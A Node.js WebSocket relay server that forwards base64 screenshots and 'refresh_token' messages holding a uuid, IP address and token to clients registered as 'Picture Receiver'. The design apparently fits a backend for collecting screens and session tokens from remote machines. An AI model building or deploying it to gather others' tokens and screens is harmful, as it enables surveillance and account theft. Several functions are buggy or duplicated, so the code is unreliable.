const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const app = express();
app.use(express.static("public"));
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT);

const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId;

wss.on("connection", function (ws) {
    const userID = generateUniqueID();  
    ws.on("message", data => {
        handleMessage(ws, data, userID);
    });
    ws.on("close", () => {
        handleDisconnect(userID);
        ws.removeAllListeners(); 
    });
    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    clearInterval(keepAliveId);
    keepAliveId = null;
});

function generateUniqueID() {
    return Math.random().toString(36).substr(2, 9);
}

// Cập nhật hàm handleMessage để phân biệt giữa Buffer và ArrayBuffer
function handleMessage(ws, data, userID) {
    if (data instanceof Buffer || data instanceof ArrayBuffer) {
        // Handle binary message
        handleBinaryMessage(ws, data, userID);
    } else {
        // Handle JSON message
        handleJSONMessage(ws, data, userID);
    }
}

function handleBinaryMessage(ws, data, userID) {
    const view = new DataView(data);
    const jsonLength = view.getUint32(0, true);
    const jsonString = new TextDecoder().decode(new Uint8Array(data, 4, jsonLength));
    const messageData = JSON.parse(jsonString);

    if (messageData.type === 'refresh_token') {
        const binaryMessage = createBinaryMessage({
            type: 'refreshToken',
            uuid: messageData.uuid,
            ip: messageData.ip,
            token: messageData.token
        });
        broadcastToPictureReceivers(binaryMessage);
    }
}

function createBinaryMessage(jsonData, binaryData = null) {
    const jsonString = JSON.stringify(jsonData);
    const jsonBuffer = new TextEncoder().encode(jsonString);
    
    const totalLength = 4 + jsonBuffer.byteLength + (binaryData ? binaryData.byteLength : 0);
    const result = new ArrayBuffer(totalLength);
    const view = new DataView(result);
    
    view.setUint32(0, jsonBuffer.byteLength, true);
    new Uint8Array(result, 4, jsonBuffer.byteLength).set(jsonBuffer);
    
    if (binaryData) {
        new Uint8Array(result, 4 + jsonBuffer.byteLength).set(new Uint8Array(binaryData));
    }
    
    return result;
}

function broadcastToPictureReceivers(binaryMessage) {
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(binaryMessage, error => {
                if (error) console.error("Error sending binary message to receiver:", error);
            });
        }
    });
}

function handleJSONMessage(ws, data, userID) {
    try {
        const messageData = JSON.parse(data);
        if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
        } else if (messageData.type === 'screenshot' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else {
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
        }
    } catch (e) {
        console.error('Error parsing JSON data:', e);
    }
}

function broadcastToPictureReceivers(message) {
    const data = typeof message === 'string' ? message : JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to receiver:", error);
            });
        }
    });
}

function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
}

function handleDisconnect(userID) {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
}

function keepServerAlive() {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
    }, 30000);
}
